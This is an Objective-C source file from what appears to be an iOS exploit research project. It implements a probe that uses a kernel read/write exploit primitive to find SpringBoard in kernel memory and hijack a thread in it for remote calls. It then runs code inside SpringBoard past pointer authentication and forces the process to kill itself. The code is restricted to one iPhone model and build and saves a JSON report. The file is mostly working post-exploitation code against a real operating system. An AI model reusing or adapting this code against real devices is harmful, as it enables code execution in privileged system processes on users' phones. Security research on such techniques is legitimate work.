#import "CNDPhysicalSpringBoardPACProbe.h"

#import "TaskRop/RemoteCall.h"
#import "kexploit/CNDLabKernelProvider.h"
#import "kexploit/kexploit_opa334.h"
#import "kexploit/krw.h"
#import "kexploit/kutils.h"
#import "kexploit/offsets.h"

#include <stdint.h>
#include <sys/sysctl.h>
#include <unistd.h>

#define CND_SPRINGBOARD_PAC_PRODUCT "iPhone17,2"
#define CND_SPRINGBOARD_PAC_BUILD "23A341"
#define CND_SPRINGBOARD_PAC_PROCESS "SpringBoard"
#define CND_SPRINGBOARD_PAC_BUNDLE "com.apple.springboard"
#define CND_SPRINGBOARD_PAC_TIMEOUT_MS 15000

static volatile int32_t gCNDPhysicalSpringBoardPACProbeRunning;

static NSString *CNDSpringBoardPACSysctlString(const char *name)
{
    char value[96] = {0};
    size_t length = sizeof(value);
    if (sysctlbyname(name, value, &length, NULL, 0) != 0 || !value[0]) {
        return @"";
    }
    return [NSString stringWithUTF8String:value] ?: @"";
}

static NSString *CNDSpringBoardPACHex(uint64_t value)
{
    return [NSString stringWithFormat:@"0x%016llx",
        (unsigned long long)value];
}

static NSDictionary<NSString *, id> *CNDSpringBoardPACSnapshotDictionary(
    const RemoteCallDebugSnapshot *snapshot)
{
    if (!snapshot) return @{};
    return @{
        @"hasLocalState": @(snapshot->hasLocalState),
        @"success": @(snapshot->success),
        @"labBackend": @(snapshot->labBackend),
        @"pid": @(snapshot->pid),
        @"proc": CNDSpringBoardPACHex(snapshot->procAddr),
        @"task": CNDSpringBoardPACHex(snapshot->taskAddr),
        @"trojanThread": CNDSpringBoardPACHex(
            snapshot->trojanThreadAddr),
        @"stableCalls": @(snapshot->stableCalls),
        @"stableFailures": @(snapshot->stableFailures),
        @"identityBootstrapRequested": @(
            snapshot->identityBootstrapRequested),
        @"identityMessageValid": @(snapshot->identityMessageValid),
        @"identityThreadRightExact": @(
            snapshot->identityThreadRightExact),
        @"identityTaskRightExact": @(snapshot->identityTaskRightExact),
        @"identityHandlerRetained": @(
            snapshot->identityHandlerRetained),
        @"identityInitialConversionSucceeded": @(
            snapshot->identityInitialConversionSucceeded),
        @"identityInitialReplySucceeded": @(
            snapshot->identityInitialReplySucceeded),
        @"identityThread": CNDSpringBoardPACHex(
            snapshot->identityThreadAddr),
        @"identityTrapAddress": CNDSpringBoardPACHex(
            snapshot->identityTrapAddress),
        @"identityConversionCount": @(
            snapshot->identityConversionCount),
        @"identityConversionFailures": @(
            snapshot->identityConversionFailures),
        @"identityConverterUnavailable": @(
            snapshot->identityConverterUnavailable),
        @"identityPACFallbackCount": @(
            snapshot->identityPACFallbackCount),
        @"identityPACFallbackFailures": @(
            snapshot->identityPACFallbackFailures),
        @"lastStableCall": [NSString stringWithUTF8String:
            snapshot->lastStableCall] ?: @"",
        @"lastStableFailure": [NSString stringWithUTF8String:
            snapshot->lastStableFailure] ?: @"",
        @"lastStableFailureReason": [NSString stringWithUTF8String:
            snapshot->lastStableFailureReason] ?: @"",
    };
}

static NSDictionary<NSString *, id> *CNDSpringBoardPACTerminalDictionary(
    const RemoteCallTerminalDispatchReport *terminal)
{
    if (!terminal) return @{};
    return @{
        @"status": @(terminal->status),
        @"sessionBound": @(terminal->sessionBound),
        @"expectedPIDBound": @(terminal->expectedPIDBound),
        @"expectedProcBound": @(terminal->expectedProcBound),
        @"expectedTaskBound": @(terminal->expectedTaskBound),
        @"liveKernelIdentityBound": @(terminal->liveKernelIdentityBound),
        @"transportHealthy": @(terminal->transportHealthy),
        @"killSymbolResolved": @(terminal->killSymbolResolved),
        @"oneWayDispatched": @(terminal->oneWayDispatched),
        @"reason": [NSString stringWithUTF8String:terminal->reason] ?: @"",
    };
}

static BOOL CNDSpringBoardPACIdentityMatches(
    pid_t pid, uint64_t proc, uint64_t task)
{
    if (pid <= 1 || !is_kaddr_valid(proc) || !is_kaddr_valid(task)) {
        return NO;
    }
    uint64_t liveProc = proc_find(pid);
    return liveProc == proc && proc_task(liveProc) == task;
}

static BOOL CNDSpringBoardPACWaitForReplacement(
    pid_t oldPID, uint64_t oldProc, uint64_t oldTask,
    pid_t *newPIDOut, uint64_t *newProcOut, uint64_t *newTaskOut)
{
    BOOL oldIdentityExited = NO;
    for (NSUInteger attempt = 0; attempt < 240; attempt++) {
        if (!oldIdentityExited) {
            oldIdentityExited = !CNDSpringBoardPACIdentityMatches(
                oldPID, oldProc, oldTask);
        }
        if (oldIdentityExited) {
            uint64_t newProc = proc_find_by_name(
                CND_SPRINGBOARD_PAC_PROCESS);
            uint64_t newTask = is_kaddr_valid(newProc)
                ? proc_task(newProc) : 0;
            pid_t newPID = is_kaddr_valid(newProc)
                ? (pid_t)kread32(newProc + off_proc_p_pid) : 0;
            if (newPID > 1 && is_kaddr_valid(newTask) &&
                (newPID != oldPID || newProc != oldProc ||
                 newTask != oldTask)) {
                if (newPIDOut) *newPIDOut = newPID;
                if (newProcOut) *newProcOut = newProc;
                if (newTaskOut) *newTaskOut = newTask;
                return YES;
            }
        }
        usleep(50000);
    }
    return NO;
}

static NSDictionary<NSString *, id> *
CNDPhysicalSpringBoardPACProbeRunOnce(void)
{
    NSMutableDictionary<NSString *, id> *report = [@{
        @"schema": @"com.zeroxjf.cyanide.physical-springboard-pac-probe",
        @"schemaVersion": @1,
        @"productType": CNDSpringBoardPACSysctlString("hw.machine"),
        @"productBuildVersion": CNDSpringBoardPACSysctlString(
            "kern.osversion"),
        @"targetProcess": @CND_SPRINGBOARD_PAC_PROCESS,
        @"targetBundleIdentifier": @CND_SPRINGBOARD_PAC_BUNDLE,
        @"markerFunction": @"getpid",
        @"cleanupMode": @"exact-process-self-SIGKILL-and-replacement",
        @"krwUsed": @YES,
        @"kernelReadUsed": @YES,
        @"kernelWriteUsed": @YES,
        @"kernelCallUsed": @NO,
        @"forgedTaskPortUsed": @NO,
        @"kernelMintedIdentityRightsUsed": @YES,
        @"targetCodeExecuted": @NO,
        @"dylibInjected": @NO,
        @"persistentMutation": @NO,
        @"startedAt": @([[NSDate date] timeIntervalSince1970]),
    } mutableCopy];

    if (!kexploit_krw_ready()) {
        report[@"result"] = @"refused-krw-unavailable";
        report[@"message"] = @"Validated physical KRW is required.";
        goto save;
    }

    uint64_t targetProc = proc_find_by_name(CND_SPRINGBOARD_PAC_PROCESS);
    uint64_t targetTask = is_kaddr_valid(targetProc)
        ? proc_task(targetProc) : 0;
    pid_t targetPID = is_kaddr_valid(targetProc)
        ? (pid_t)kread32(targetProc + off_proc_p_pid) : 0;
    report[@"targetPIDBefore"] = @(targetPID);
    report[@"targetProcBefore"] = CNDSpringBoardPACHex(targetProc);
    report[@"targetTaskBefore"] = CNDSpringBoardPACHex(targetTask);
    if (!CNDSpringBoardPACIdentityMatches(
            targetPID, targetProc, targetTask)) {
        report[@"result"] = @"refused-springboard-identity";
        goto save;
    }

    int initResult = init_remote_call_identity_bootstrap_original_thread_only(
        CND_SPRINGBOARD_PAC_PROCESS, CND_SPRINGBOARD_PAC_TIMEOUT_MS);
    report[@"remoteCallInitResult"] = @(initResult);
    report[@"remoteCallInitFailure"] = @(
        remote_call_last_init_failure());
    report[@"remoteCallInitFailureDescription"] =
        [NSString stringWithUTF8String:remote_call_init_failure_description(
            remote_call_last_init_failure())] ?: @"unknown";

    RemoteCallDebugSnapshot initialized = {0};
    (void)remote_call_copy_debug_snapshot(&initialized);
    report[@"afterInitialize"] =
        CNDSpringBoardPACSnapshotDictionary(&initialized);
    if (initResult != 0) {
        report[@"result"] = @"failed-identity-bootstrap";
        goto save;
    }

    uint64_t markerPID = do_remote_call_stable(
        2000, "getpid", 0, 0, 0, 0, 0, 0, 0, 0);
    RemoteCallDebugSnapshot afterMarker = {0};
    (void)remote_call_copy_debug_snapshot(&afterMarker);
    report[@"markerPID"] = @(markerPID);
    report[@"markerMatchedTargetPID"] = @(
        markerPID == (uint64_t)targetPID);
    report[@"afterMarker"] =
        CNDSpringBoardPACSnapshotDictionary(&afterMarker);

    BOOL markerValid = markerPID == (uint64_t)targetPID &&
        remote_call_current_success() &&
        CNDSpringBoardPACIdentityMatches(targetPID, targetProc, targetTask);
    if (!markerValid) {
        report[@"result"] = @"failed-springboard-marker";
        report[@"manualRestartRequired"] = @YES;
        goto save;
    }

    RemoteCallTerminalDispatchReport terminal = {0};
    RemoteCallTerminalDispatchStatus dispatchStatus =
        remote_call_dispatch_self_sigkill(
            targetPID, targetProc, targetTask, &terminal);
    RemoteCallDebugSnapshot afterDispatch = {0};
    (void)remote_call_copy_debug_snapshot(&afterDispatch);
    report[@"terminalDispatch"] =
        CNDSpringBoardPACTerminalDictionary(&terminal);
    report[@"afterTerminalDispatch"] =
        CNDSpringBoardPACSnapshotDictionary(&afterDispatch);

    pid_t replacementPID = 0;
    uint64_t replacementProc = 0;
    uint64_t replacementTask = 0;
    BOOL replacementObserved = dispatchStatus ==
            RemoteCallTerminalDispatchPossible &&
        terminal.oneWayDispatched &&
        CNDSpringBoardPACWaitForReplacement(
            targetPID, targetProc, targetTask,
            &replacementPID, &replacementProc, &replacementTask);
    BOOL oldIdentityExited = !CNDSpringBoardPACIdentityMatches(
        targetPID, targetProc, targetTask);
    report[@"oldSpringBoardIdentityExited"] = @(oldIdentityExited);
    report[@"replacementSpringBoardObserved"] = @(replacementObserved);
    report[@"replacementPID"] = @(replacementPID);
    report[@"replacementProc"] = CNDSpringBoardPACHex(replacementProc);
    report[@"replacementTask"] = CNDSpringBoardPACHex(replacementTask);

    BOOL sessionClosed = NO;
    if (oldIdentityExited) {
        abandon_remote_call();
        sessionClosed = !remote_call_has_local_state();
    }
    report[@"remoteSessionClosed"] = @(sessionClosed);
    report[@"exceptionPolicyClearedByReplacement"] = @(
        oldIdentityExited && replacementObserved);
    report[@"manualRestartRequired"] = @(!oldIdentityExited);

    BOOL signerPathValid = afterDispatch.identityConverterUnavailable &&
        afterDispatch.identityConversionFailures == 1 &&
        afterDispatch.identityPACFallbackCount >= 3 &&
        afterDispatch.identityPACFallbackFailures == 0;
    BOOL success = initialized.identityBootstrapRequested &&
        initialized.identityMessageValid &&
        initialized.identityThreadRightExact &&
        initialized.identityTaskRightExact &&
        initialized.identityHandlerRetained &&
        initialized.identityInitialConversionSucceeded &&
        initialized.identityInitialReplySucceeded &&
        markerValid && signerPathValid &&
        dispatchStatus == RemoteCallTerminalDispatchPossible &&
        terminal.oneWayDispatched && oldIdentityExited &&
        replacementObserved && sessionClosed;
    report[@"targetCodeExecuted"] = @(markerValid);
    report[@"krwPACContextFallbackUsed"] = @(
        afterDispatch.identityPACFallbackCount > 0);
    report[@"exactSpringBoardCrossProcessPACExecution"] = @(success);
    report[@"result"] = success
        ? @"success-springboard-cross-process-pac-execution"
        : @"failed-springboard-cross-process-pac-execution";

save:
    report[@"completedAt"] = @([[NSDate date] timeIntervalSince1970]);
    NSArray<NSString *> *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *directory = documents.firstObject ?: NSTemporaryDirectory();
    NSString *path = [directory stringByAppendingPathComponent:
        @"CNDPhysicalSpringBoardPACProbe.json"];
    report[@"reportPath"] = path;
    NSData *data = [NSJSONSerialization dataWithJSONObject:report
        options:NSJSONWritingPrettyPrinted | NSJSONWritingSortedKeys
        error:nil];
    report[@"reportSaved"] = @(data && [data writeToFile:path
        options:NSDataWritingAtomic error:nil]);
    return [report copy];
}

BOOL CNDPhysicalSpringBoardPACProbeIsSupported(
    NSString * _Nullable * _Nullable reasonOut)
{
    NSString *product = CNDSpringBoardPACSysctlString("hw.machine");
    NSString *build = CNDSpringBoardPACSysctlString("kern.osversion");
    BOOL physical = !cnd_lab_vphone_guest();
    BOOL supported = physical &&
        [product isEqualToString:@CND_SPRINGBOARD_PAC_PRODUCT] &&
        [build isEqualToString:@CND_SPRINGBOARD_PAC_BUILD];
    if (reasonOut) {
        if (!physical) {
            *reasonOut = @"Physical SpringBoard probe; vPhone is refused.";
        } else if (supported) {
            *reasonOut = @"Exact physical iPhone17,2 / 23A341 target matched.";
        } else {
            *reasonOut = [NSString stringWithFormat:
                @"Requires physical iPhone17,2 on 23A341; this device is %@ on %@.",
                product.length ? product : @"unknown hardware",
                build.length ? build : @"unknown build"];
        }
    }
    return supported;
}

BOOL CNDPhysicalSpringBoardPACProbeIsRunning(void)
{
    return __sync_fetch_and_add(
        &gCNDPhysicalSpringBoardPACProbeRunning, 0) != 0;
}

void CNDPhysicalSpringBoardPACProbeRun(
    CNDPhysicalSpringBoardPACProbeCompletion completion)
{
    if (!completion) return;
    NSString *supportReason = nil;
    if (!CNDPhysicalSpringBoardPACProbeIsSupported(&supportReason)) {
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(@{
                @"result": @"refused-unsupported-device",
                @"message": supportReason ?: @"Unsupported device.",
            });
        });
        return;
    }
    if (!__sync_bool_compare_and_swap(
            &gCNDPhysicalSpringBoardPACProbeRunning, 0, 1)) {
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(@{
                @"result": @"refused-already-running",
                @"message": @"The SpringBoard PAC probe is already running.",
            });
        });
        return;
    }

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSDictionary<NSString *, id> *report =
            CNDPhysicalSpringBoardPACProbeRunOnce();
        __sync_lock_release(&gCNDPhysicalSpringBoardPACProbeRunning);
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(report ?: @{ @"result": @"unknown-result" });
        });
    });
}
